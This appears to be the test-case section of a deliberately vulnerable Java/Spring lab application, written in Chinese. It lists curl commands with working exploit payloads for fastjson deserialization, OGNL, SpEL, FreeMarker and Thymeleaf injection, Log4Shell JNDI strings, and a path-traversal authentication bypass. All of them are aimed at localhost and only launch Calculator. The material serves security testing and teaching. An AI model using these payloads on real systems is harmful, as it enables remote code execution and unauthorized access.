### 测试用例

1. 测试/actuator接口
2. 测试fastjson漏洞
   ```   
   curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"org.apache.commons.proxy.provider.remoting.RmiProvider","host":"127.0.0.1",port:"1099","name":"Exploit"}'
   curl 127.0.0.1:8080/fastjson/parse -d 'json={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true}'
   ```
3. 测试 alwaysUseFullPath 认证绕过漏洞: http://rui0.cn/archives/1643
   * 直接访问 /admin/auth 会提示认证失败
   * 使用 /admin/no-auth/%2e%2e/auth 可以绕过认证
4. 测试ognl执行
   ```
   curl 127.0.0.1:8080/ognl/parse -d 'ognl=#a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{"open", "/System/Applications/Calculator.app/"})).start()'
   ```
5. 测试spel执行
   ```
   curl 127.0.0.1:8080/spel/parse -d "spel=T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')"
   ```
6. 测试log4j漏洞
   ```
   curl 127.0.0.1:8080/log4j -d 'log=${jndi:ldap://127.0.0.1:1099/a}'
   ```
7. 测试freemarker漏洞(JythonRuntime需要本地有class): https://tttang.com/archive/1412/
   ```
   curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("open /System/Applications/Calculator.app")</@value>'
   curl 127.0.0.1:8080/freemarker/unsafe -d 'template=<#assign value%3d"freemarker.template.utility.Execute"?new()>$${value("open /System/Applications/Calculator.app")}'
   ```
8. 测试jndi lookup
   ```
   curl 127.0.0.1:8080/jndi/lookup -d 'url=ldap://127.0.0.1:1389/a'
   ```
9. 测试thymeleaf模板注入
   ```
   curl 'http://127.0.0.1:8080/thymeleaf/path?lang=__%24%7BT(java.lang.Runtime).getRuntime().exec(%27%6F%70%65%6E%20%2F%53%79%73%74%65%6D%2F%41%70%70%6C%69%63%61%74%69%6F%6E%73%2F%43%61%6C%63%75%6C%61%74%6F%72%2E%61%70%70%27)%7D__::.xx'
   ```